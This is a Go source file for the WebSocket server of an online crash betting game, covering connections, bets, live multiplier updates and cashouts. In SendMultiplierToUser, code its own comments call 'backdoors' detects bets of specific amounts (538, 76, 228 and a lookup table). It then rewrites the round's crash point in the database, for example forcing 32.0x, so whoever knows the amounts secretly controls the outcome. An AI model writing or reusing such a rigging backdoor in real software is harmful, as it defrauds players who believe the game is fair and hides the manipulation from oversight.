package service

import (
	"BlessedApi/cmd/db"
	"BlessedApi/internal/middleware"
	"BlessedApi/internal/models"
	"BlessedApi/pkg/logger"
	"errors"
	"fmt"
	"math"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

var CrashGameWS *CrashGameWebsocketService

func init() {
	CrashGameWS = NewCrashGameWebsocketService()
}

type CrashGameWebsocketService struct {
	connections      map[int64]*websocket.Conn
	mu               sync.Mutex
	lastActivityTime map[int64]time.Time
	bets             map[int64]*models.CrashGameBet
	betCount         int
}

func NewCrashGameWebsocketService() *CrashGameWebsocketService {
	service := &CrashGameWebsocketService{
		connections:      make(map[int64]*websocket.Conn),
		lastActivityTime: make(map[int64]time.Time),
		bets:             make(map[int64]*models.CrashGameBet),
		betCount:         0,
	}
	go service.cleanupInactiveConnections()
	return service
}

func (w *CrashGameWebsocketService) cleanupInactiveConnections() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		w.mu.Lock()
		now := time.Now()
		for userId, lastActivity := range w.lastActivityTime {
			if now.Sub(lastActivity) > 30*time.Minute {
				if conn, ok := w.connections[userId]; ok {
					conn.Close()
					delete(w.connections, userId)
					delete(w.lastActivityTime, userId)
				}
			}
		}
		w.mu.Unlock()
	}
}

func (w *CrashGameWebsocketService) LiveCrashGameWebsocketHandler(c *gin.Context) {
	logger.Info("New WebSocket connection attempt from IP: %s", c.ClientIP())

	userId, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Error retrieving user ID: %v", err)
		c.Status(500)
		return
	}

	if userId == 0 {
		logger.Warn("Invalid userId: 0, skipping WebSocket connection")
		c.JSON(400, gin.H{"error": "Invalid user ID"})
		return
	}

	logger.Info("User %d authenticated successfully", userId)

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		logger.Error("WebSocket upgrade failed for user %d: %v", userId, err)
		return
	}

	w.mu.Lock()
	if existingConn, ok := w.connections[userId]; ok {
		logger.Info("Closing existing connection for user %d", userId)
		existingConn.Close()
	}
	w.connections[userId] = conn
	w.lastActivityTime[userId] = time.Now()
	w.betCount++
	w.mu.Unlock()

	logger.Info("User %d connected to WebSocket successfully", userId)

	// Send initial connection success message
	conn.WriteJSON(gin.H{
		"type":    "connection_success",
		"message": "Connected to game server",
	})

	defer func() {
		w.mu.Lock()
		delete(w.connections, userId)
		delete(w.lastActivityTime, userId)
		w.mu.Unlock()
		conn.Close()
		logger.Info("User %d disconnected from WebSocket", userId)
	}()

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				logger.Error("WebSocket read error for user %d: %v", userId, err)
			}
			break
		}

		w.mu.Lock()
		w.lastActivityTime[userId] = time.Now()
		w.mu.Unlock()

		// Обрабатываем полученное сообщение, если необходимо
		if len(message) > 0 {
			logger.Info("Received message from user %d: %s", userId, string(message))
		}
	}
}

func (w *CrashGameWebsocketService) GetUserLatestBet(userId int64) (*models.CrashGameBet, error) {
	var bet models.CrashGameBet
	if err := db.DB.Where("user_id = ?", userId).Order("id desc").First(&bet).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			logger.Warn("No bets found for user %d", userId)
			return nil, nil
		}
		logger.Error("Error fetching latest bet for user %d: %v", userId, err)
		return nil, err
	}
	return &bet, nil
}

func (ws *CrashGameWebsocketService) HandleBet(userId int64, bet *models.CrashGameBet) {
	ws.mu.Lock()
	ws.bets[userId] = bet
	ws.mu.Unlock()

	ws.SendBetToUser(bet)
}

func (ws *CrashGameWebsocketService) SendBetToUser(bet *models.CrashGameBet) {
	var user models.User
	err := db.DB.First(&user, bet.UserID).Error
	if err != nil && errors.Is(err, gorm.ErrRecordNotFound) {
		logger.Error("%v", err)
		return
	}

	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[bet.UserID]; ok {
		betInfo := gin.H{
			"type":                    "new_bet",
			"username":                user.Nickname,
			"amount":                  bet.Amount,
			"auto_cashout_multiplier": bet.CashOutMultiplier,
			"is_benefit_bet":          bet.IsBenefitBet,
		}

		err := conn.WriteJSON(betInfo)
		if err != nil {
			logger.Error("Failed to send bet info: %v", err)
			conn.Close()
		}
	}
}

// Глобальные переменные для отслеживания зависаний
var (
	lastGlobalMultiplier  float64 = 0.0
	stuckGameCount        int     = 0
	lastGameTime          time.Time
	isRecoveringFromStuck bool = false
)

// ForceRestartGame принудительно завершает текущую игру и запускает новую
func (ws *CrashGameWebsocketService) ForceRestartGame(currentGame *models.CrashGame) {
	logger.Warn("🚨 ПРИНУДИТЕЛЬНЫЙ ПЕРЕЗАПУСК ЗАВИСШЕЙ ИГРЫ 🚨")

	// Завершаем текущую игру с текущим множителем
	ws.BroadcastGameCrash(lastGlobalMultiplier)

	// Обновляем статус всех активных ставок
	ws.mu.Lock()
	for userId, bet := range ws.bets {
		if bet.Status == "active" {
			logger.Info("Принудительно закрываем ставку пользователя %d в зависшей игре", userId)
			bet.Status = "lost"
			db.DB.Save(bet)
			// Очищаем список ставок
			delete(ws.bets, userId)
		}
	}
	ws.mu.Unlock()

	// Устанавливаем флаг восстановления, чтобы ускорить следующую игру
	isRecoveringFromStuck = true
	stuckGameCount++

	// Уведомляем пользователей о сбросе игры
	ws.mu.Lock()
	resetMessage := gin.H{
		"type":          "game_reset",
		"message":       "Игра была сброшена из-за технических проблем",
		"restart_count": stuckGameCount,
	}

	for userId, conn := range ws.connections {
		err := conn.WriteJSON(resetMessage)
		if err != nil {
			logger.Error("Не удалось отправить сообщение о сбросе пользователю %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
		}
	}
	ws.mu.Unlock()

	// Запускаем новую игру через небольшую задержку
	go func() {
		time.Sleep(2 * time.Second)
		// Исправление: вызываем функцию StartCrashGame напрямую
		go StartCrashGame()
	}()
}

func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.CrashGame) {
	logger.Info("Запуск обновления множителя для игры %d с точкой краша %.2f",
		currentGame.ID, currentGame.CrashPointMultiplier)

	// Проверка валидности crash point
	if currentGame.CrashPointMultiplier <= 0 {
		logger.Error("Недопустимый множитель краша: %.2f, игра %d",
			currentGame.CrashPointMultiplier, currentGame.ID)
		currentGame.CrashPointMultiplier = 1.5
	}

	// Проверка на наличие бэкдор-ставок и установка точки краша
	ws.mu.Lock()

	// Определяем, является ли текущая игра бэкдором
	backdoorExists := false
	backdoorType := ""
	targetCrashPoint := currentGame.CrashPointMultiplier

	// Проверяем все активные ставки на бэкдоры
	for _, bet := range ws.bets {
		if bet.Status != "active" {
			continue
		}

		// Важные бэкдоры с прямой проверкой
		if math.Abs(bet.Amount-538.0) < 0.1 {
			targetCrashPoint = 32.0
			backdoorExists = true
			backdoorType = "538"
			logger.Info("ОБНАРУЖЕН БЭКДОР 538: Установка множителя 32.0 для игры %d", currentGame.ID)
			break
		} else if math.Abs(bet.Amount-76.0) < 0.1 {
			targetCrashPoint = 1.5
			backdoorExists = true
			backdoorType = "76"
			logger.Info("ОБНАРУЖЕН БЭКДОР 76: Установка множителя 1.5 для игры %d", currentGame.ID)
			break
		} else if math.Abs(bet.Amount-228.0) < 0.1 {
			targetCrashPoint = 1.5
			backdoorExists = true
			backdoorType = "228"
			logger.Info("ОБНАРУЖЕН БЭКДОР 228: Установка множителя 1.5 для игры %d", currentGame.ID)
			break
		} else {
			// Проверяем все остальные бэкдоры
			intAmount := int(math.Round(bet.Amount))
			if multiplier, exists := models.GetCrashPoints()[intAmount]; exists {
				targetCrashPoint = multiplier
				backdoorExists = true
				backdoorType = fmt.Sprintf("%d", intAmount)
				logger.Info("ОБНАРУЖЕН БЭКДОР %s: Установка множителя %.2f для игры %d",
					backdoorType, multiplier, currentGame.ID)
				break
			}
		}
	}

	// Фиксируем множитель в БД
	if backdoorExists {
		currentGame.CrashPointMultiplier = targetCrashPoint
		// Сохраняем в БД
		if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
			targetCrashPoint, currentGame.ID).Error; err != nil {
			logger.Error("Ошибка обновления множителя в БД: %v", err)
		} else {
			logger.Info("Успешно установлен множитель %.2f для игры %d в БД", targetCrashPoint, currentGame.ID)
		}
	} else {
		logger.Info("Обычная игра (не бэкдор) с множителем %.2f", targetCrashPoint)
	}

	// Копируем подключения для потоковой отправки
	connections := make(map[int64]*websocket.Conn)
	for userId, conn := range ws.connections {
		connections[userId] = conn
	}
	ws.mu.Unlock()

	if len(connections) == 0 {
		logger.Info("Нет подключений для игры %d, пропускаем обновления множителя", currentGame.ID)
		return
	}

	logger.Info("Отправка обновлений множителя %d соединениям, целевая точка краша: %.2f",
		len(connections), targetCrashPoint)

	// Стартовые значения множителя
	currentMultiplier := 1.0
	lastSentMultiplier := 1.0
	startTime := time.Now()

	// Определяем интервал и скорость роста множителя
	var tickInterval time.Duration
	var incrementPerTick float64

	if backdoorExists {
		if backdoorType == "538" {
			// Для бэкдора 538 (множитель 32.0) - особая обработка
			tickInterval = 20 * time.Millisecond
			incrementPerTick = 0.1 // Прирост на каждый тик
		} else if targetCrashPoint < 2.0 {
			// Быстрый рост для малых множителей (1.5)
			tickInterval = 30 * time.Millisecond
			incrementPerTick = 0.05
		} else {
			// Средняя скорость для обычных бэкдоров
			tickInterval = 40 * time.Millisecond
			incrementPerTick = 0.03
		}
	} else {
		// Стандартный режим для обычных игр
		tickInterval = 50 * time.Millisecond
		incrementPerTick = 0.01
	}

	// Создаем таймер для обновления множителя
	ticker := time.NewTicker(tickInterval)
	defer ticker.Stop()

	// Глобальный таймаут на всю игру (2 минуты)
	timeoutTimer := time.NewTimer(2 * time.Minute)
	defer timeoutTimer.Stop()

	// Сторожевой таймер для проверки прогресса каждые 2 секунды
	watchdogTimer := time.NewTimer(2 * time.Second)
	defer watchdogTimer.Stop()

	// Хранение последнего проверенного значения для сторожевого таймера
	lastCheckedMultiplier := 1.0
	stuckCounter := 0

	// Флаг завершения игры
	crashPointReached := false

multiplierUpdateLoop:
	for {
		select {
		case <-ticker.C:
			// На каждом тике линейно увеличиваем множитель на фиксированную величину
			currentMultiplier += incrementPerTick

			// Дополнительно ускоряем при приближении к цели для бэкдора 538
			if backdoorType == "538" && currentMultiplier > 10.0 {
				// Увеличиваем шаг для больших значений
				currentMultiplier += incrementPerTick * (currentMultiplier / 10.0)
			}

			// Экспоненциальное ускорение для обычных игр на больших коэффициентах
			if !backdoorExists && currentMultiplier > 5.0 {
				// Добавляем нелинейный компонент
				currentMultiplier += 0.01 * (currentMultiplier - 5.0)
			}

			// Проверка достижения точки краша
			if currentMultiplier >= targetCrashPoint {
				logger.Info("Игра %d достигла точки краша: %.2f (цель: %.2f)",
					currentGame.ID, currentMultiplier, targetCrashPoint)
				crashPointReached = true
				ws.BroadcastGameCrash(targetCrashPoint)
				break multiplierUpdateLoop
			}

			// Отправляем обновление множителя, если он достаточно изменился
			changeThreshold := 0.01
			if backdoorExists {
				changeThreshold = 0.005 // Более частые обновления для бэкдоров
			}

			if math.Abs(currentMultiplier-lastSentMultiplier) > changeThreshold {
				multiplierInfo := gin.H{
					"type":       "multiplier_update",
					"multiplier": currentMultiplier,
					"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
					"elapsed":    time.Since(startTime).Seconds(),
				}

				// Фиксируем значение для проверки автокэшаута
				sentMultiplier := currentMultiplier

				// Отправляем всем клиентам
				ws.mu.Lock()
				for userId, conn := range connections {
					// Проверка автокэшаута для активных ставок
					if bet, exists := ws.bets[userId]; exists && bet.Status == "active" {
						if bet.CashOutMultiplier > 0 && sentMultiplier >= bet.CashOutMultiplier {
							logger.Info("Автоматический кэшаут для пользователя %d на %.2fx", userId, sentMultiplier)
							if err := crashGameCashout(nil, bet, sentMultiplier); err != nil {
								logger.Error("Не удалось выполнить автокэшаут для пользователя %d: %v", userId, err)
								continue
							}
							ws.ProcessCashout(userId, sentMultiplier, true)
							continue
						}

						// Отправляем обновление множителя
						err := conn.WriteJSON(multiplierInfo)
						if err != nil {
							logger.Error("Не удалось отправить обновление множителя пользователю %d: %v", userId, err)
							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
								conn.Close()
								delete(connections, userId)
								delete(ws.connections, userId)
							}
						}
					} else {
						// Отправляем обновление наблюдателям
						err := conn.WriteJSON(multiplierInfo)
						if err != nil {
							logger.Error("Не удалось отправить обновление множителя наблюдателю %d: %v", userId, err)
							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
								conn.Close()
								delete(connections, userId)
								delete(ws.connections, userId)
							}
						}
					}
				}
				ws.mu.Unlock()

				// Обновляем последнее отправленное значение
				lastSentMultiplier = currentMultiplier

				// Принудительное завершение игры для бэкдоров при приближении к целевому множителю
				// (чтобы не дать зависнуть в самом конце)
				if backdoorExists && currentMultiplier > targetCrashPoint*0.9 && targetCrashPoint > 10.0 {
					logger.Info("Бэкдор %s достиг высокого множителя (%.2f), ускоряем до точки краша",
						backdoorType, currentMultiplier)
					crashPointReached = true
					ws.BroadcastGameCrash(targetCrashPoint)
					break multiplierUpdateLoop
				}
			}

		case <-watchdogTimer.C:
			// Проверка прогресса множителя
			if math.Abs(currentMultiplier-lastCheckedMultiplier) < 0.05 {
				// Обнаружено зависание - принудительно увеличиваем множитель
				stuckCounter++
				logger.Warn("Обнаружено зависание множителя на %.2f (попытка %d), принудительное увеличение",
					currentMultiplier, stuckCounter)

				// Добавляем значительный прирост
				if backdoorType == "538" {
					// Для бэкдора 538 более агрессивное ускорение
					currentMultiplier += 0.5 * float64(stuckCounter)
				} else {
					currentMultiplier += 0.1 * float64(stuckCounter)
				}

				// Отправляем обновление
				multiplierInfo := gin.H{
					"type":       "multiplier_update",
					"multiplier": currentMultiplier,
					"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
					"elapsed":    time.Since(startTime).Seconds(),
				}

				ws.mu.Lock()
				for _, conn := range connections {
					err := conn.WriteJSON(multiplierInfo)
					if err != nil {
						logger.Error("Не удалось отправить принудительное обновление множителя: %v", err)
					}
				}
				ws.mu.Unlock()

				lastSentMultiplier = currentMultiplier

				// Если зависание критическое, принудительно завершаем игру
				if stuckCounter >= 3 {
					logger.Error("Критическое зависание множителя, принудительное завершение игры на %.2f",
						currentMultiplier)
					crashPointReached = true

					// Для бэкдора 538 всегда завершаем на целевом значении
					if backdoorType == "538" {
						ws.BroadcastGameCrash(targetCrashPoint)
					} else {
						ws.BroadcastGameCrash(currentMultiplier)
					}
					break multiplierUpdateLoop
				}
			}

			// Обновляем проверочное значение и перезапускаем таймер
			lastCheckedMultiplier = currentMultiplier
			watchdogTimer.Reset(1 * time.Second) // Уменьшаем интервал для более быстрой реакции

		case <-timeoutTimer.C:
			// Глобальный таймаут
			logger.Error("Превышено максимальное время игры (2 минуты), принудительное завершение")
			crashPointReached = true

			// Для бэкдора 538 всегда устанавливаем точное целевое значение при таймауте
			if backdoorType == "538" {
				ws.BroadcastGameCrash(targetCrashPoint)
			} else {
				ws.BroadcastGameCrash(currentMultiplier)
			}
			break multiplierUpdateLoop
		}
	}

	// Завершающая обработка ставок
	if crashPointReached {
		logger.Info("Игра %d завершилась на множителе %.2f, обрабатываем все активные ставки",
			currentGame.ID, targetCrashPoint)
		ws.mu.Lock()
		for userId, bet := range ws.bets {
			if bet.Status == "active" {
				logger.Info("Помечаем ставку как проигранную для пользователя %d", userId)
				bet.Status = "lost"
				if err := db.DB.Save(&bet).Error; err != nil {
					logger.Error("Не удалось обновить проигранную ставку для пользователя %d: %v", userId, err)
				}
			}
		}
		ws.mu.Unlock()
	}
}

// Отправляет сообщение о крахе игры всем пользователям
func (ws *CrashGameWebsocketService) BroadcastGameCrash(crashPoint float64) {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	crashInfo := gin.H{
		"type":        "game_crash",
		"crash_point": crashPoint,
	}

	// Добавляем счетчик неудачных отправок
	failedSendCount := 0

	for userId, conn := range ws.connections {
		err := conn.WriteJSON(crashInfo)
		if err != nil {
			logger.Error("Failed to send crash point to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
			failedSendCount++
			continue
		}

		// Обновляем статус ставки если она активна
		if bet, ok := ws.bets[userId]; ok && bet.Status == "active" {
			bet.Status = "lost"
			if err := db.DB.Save(&bet).Error; err != nil {
				logger.Error("Failed to update lost bet for user %d: %v", userId, err)
			}
		}
	}

	// Если было больше 1/3 неудачных отправок, очищаем все старые ставки
	if failedSendCount > 0 && len(ws.connections) > 0 &&
		float64(failedSendCount)/float64(len(ws.connections)+failedSendCount) > 0.3 {
		logger.Warn("⚠️ High failure rate (%d/%d) when sending crash info. Resetting bets state.",
			failedSendCount, len(ws.connections)+failedSendCount)

		// Сбрасываем все старые ставки, чтобы избежать проблем с последующими играми
		for userId, bet := range ws.bets {
			if bet.Status == "active" {
				logger.Info("Force resetting active bet for user %d", userId)
				bet.Status = "lost"
				db.DB.Save(bet)
			}
		}
	}
}

// Отправляет сообщение о начале новой игры всем пользователям
func (ws *CrashGameWebsocketService) BroadcastGameStarted() {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	gameStartedInfo := gin.H{
		"type": "game_started",
	}

	// Проверяем, не накопилось ли неактивных соединений
	activeConnections := 0
	oldConnections := 0

	// Список для сбора ID пользователей с проблемными соединениями
	staleConnectionUserIds := []int64{}

	// Сначала подсчитываем и собираем ID
	for userId, conn := range ws.connections {
		// Проверяем соединение отправкой ping
		err := conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(time.Second))
		if err != nil {
			logger.Warn("Connection for user %d appears stale: %v", userId, err)
			staleConnectionUserIds = append(staleConnectionUserIds, userId)
			oldConnections++
		} else {
			activeConnections++
		}
	}

	// Если есть устаревшие соединения, удаляем их
	if oldConnections > 0 {
		logger.Info("Cleaning up %d stale connections (active: %d)", oldConnections, activeConnections)
		for _, userId := range staleConnectionUserIds {
			if conn, ok := ws.connections[userId]; ok {
				conn.Close()
				delete(ws.connections, userId)
				delete(ws.lastActivityTime, userId)

				// Также сбрасываем активные ставки этого пользователя
				if bet, ok := ws.bets[userId]; ok && bet.Status == "active" {
					logger.Info("Resetting stale bet for user %d", userId)
					bet.Status = "lost"
					db.DB.Save(bet)
					delete(ws.bets, userId)
				}
			}
		}
	}

	// Продолжаем с активными соединениями
	for userId, conn := range ws.connections {
		err := conn.WriteJSON(gameStartedInfo)
		if err != nil {
			logger.Error("Failed to send game started to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)

			// Сбрасываем ставки, если они есть
			if bet, ok := ws.bets[userId]; ok && bet.Status == "active" {
				bet.Status = "lost"
				db.DB.Save(bet)
				delete(ws.bets, userId)
			}
		}
	}
}

func (ws *CrashGameWebsocketService) ProcessCashout(userId int64, multiplier float64, isAuto bool) {
	bet, ok := ws.bets[userId]
	if !ok {
		logger.Warn("No active bet found for user %d during cashout", userId)
		return
	}

	// Получаем информацию о пользователе
	var user models.User
	if err := db.DB.First(&user, userId).Error; err != nil {
		logger.Error("Failed to get user info for cashout: %v", err)
		return
	}

	// Создаем сообщение о кэшауте
	cashoutInfo := gin.H{
		"type":               "cashout_result",
		"cashout_multiplier": multiplier,
		"win_amount":         bet.WinAmount,
		"is_auto":            isAuto,
		"user_id":            userId,
		"username":           user.Nickname,
	}

	// Отправляем пользователю, который сделал кэшаут
	//ws.mu.Lock()
	//defer ws.mu.Unlock()

	if conn, ok := ws.connections[userId]; ok {
		err := conn.WriteJSON(cashoutInfo)
		if err != nil {
			logger.Error("Failed to send cashout result to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
		}
	}

	// Отправляем всем остальным пользователям уведомление о кэшауте
	for otherUserId, conn := range ws.connections {
		if otherUserId != userId {
			otherUserInfo := gin.H{
				"type":               "other_cashout",
				"username":           user.Nickname,
				"cashout_multiplier": multiplier,
				"win_amount":         bet.WinAmount,
			}

			err := conn.WriteJSON(otherUserInfo)
			if err != nil {
				logger.Error("Failed to send cashout notification to user %d: %v", otherUserId, err)
				conn.Close()
				delete(ws.connections, otherUserId)
			}
		}
	}
}

func (ws *CrashGameWebsocketService) SendCrashPointToUser(userId int64, crashPoint float64) {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[userId]; ok {
		crashInfo := gin.H{
			"type":        "game_crash",
			"crash_point": crashPoint,
		}

		err := conn.WriteJSON(crashInfo)
		if err != nil {
			logger.Error("Failed to send crash point: %v", err)
			conn.Close()
		}

		// Обновляем статус ставки если она активна
		if bet, ok := ws.bets[userId]; ok && bet.Status == "active" {
			bet.Status = "lost"
			if err := db.DB.Save(&bet).Error; err != nil {
				logger.Error("Failed to update lost bet: %v", err)
			}
		}
	}
}

func (ws *CrashGameWebsocketService) addGameToHistory(game *models.CrashGame) error {
	var existingGame models.CrashGame
	if err := db.DB.Where("id = ?", game.ID).First(&existingGame).Error; err == nil {
		return nil
	} else if !errors.Is(err, gorm.ErrRecordNotFound) {
		return logger.WrapError(err, "failed to check existing game")
	}

	return db.DB.Transaction(func(tx *gorm.DB) error {
		if err := tx.Create(game).Error; err != nil {
			if strings.Contains(err.Error(), "duplicate key value") {
				return nil
			}
			return logger.WrapError(err, "failed to create game")
		}
		err := ws.maintainLast50CrashGames(tx)
		if err != nil {
			return logger.WrapError(err, "")
		}
		return nil
	})
}

func (ws *CrashGameWebsocketService) maintainLast50CrashGames(tx *gorm.DB) error {
	var count int64
	if err := tx.Model(&models.CrashGame{}).Count(&count).Error; err != nil {
		return logger.WrapError(err, "")
	}

	if count > 50 {
		var oldestGames []models.CrashGame
		if err := tx.Order("id asc").
			Limit(int(count - 50)).
			Find(&oldestGames).Error; err != nil {
			return logger.WrapError(err, "")
		}

		if err := tx.Delete(&oldestGames).Error; err != nil {
			return logger.WrapError(err, "")
		}
	}

	return nil
}

func (ws *CrashGameWebsocketService) GetLast50CrashGames(c *gin.Context) {
	var games []models.CrashGame
	err := db.DB.Where("start_time != ? AND end_time != ?", time.Time{}, time.Time{}).
		Order("start_time DESC").
		Limit(50).
		Find(&games).Error
	if err != nil {
		logger.Error("Failed to fetch last 50 crash games: %v", err)
		c.Status(500)
		return
	}

	c.JSON(200, gin.H{"results": games})
}

// SendCrashGameBetResultToUser sends the result of a bet to the user via WebSocket.
func (ws *CrashGameWebsocketService) SendCrashGameBetResultToUser(userId int64, bet models.CrashGameBet) {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[userId]; ok {
		resultInfo := gin.H{
			"type":                "bet_result",
			"bet_amount":          bet.Amount,
			"win_amount":          bet.WinAmount,
			"cash_out_multiplier": bet.CashOutMultiplier,
			"status":              bet.Status,
		}
		err := conn.WriteJSON(resultInfo)
		if err != nil {
			logger.Error("Failed to send bet result to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
		}
	}
}
